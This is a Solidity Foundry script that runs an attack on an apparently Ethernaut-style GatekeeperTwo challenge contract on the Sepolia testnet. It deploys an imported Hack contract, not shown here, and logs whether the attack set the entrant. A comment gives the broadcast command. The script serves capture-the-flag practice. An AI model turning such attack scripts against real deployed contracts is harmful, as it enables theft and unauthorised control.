// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Hack, GatekeeperTwo} from "../src/level14.sol";

contract Level14Script is Script {
    function run(address instanceAddress) external {
        GatekeeperTwo target = GatekeeperTwo(instanceAddress);
        address entrantBefore = target.entrant();
        console.log("Entrant before: ", entrantBefore);

        vm.startBroadcast();
        new Hack(instanceAddress);
        vm.stopBroadcast();

        address entrantAfter = target.entrant();
        console.log("Entrant after: ", entrantAfter);
        console.log("Attack successful: ", entrantAfter != address(0));
    }
}
//forge script script/level14.s.sol:Level14Script --rpc-url $SEPOLIA_RPC_URL --broadcast --account yourkey --sig "run(address)" your instance address
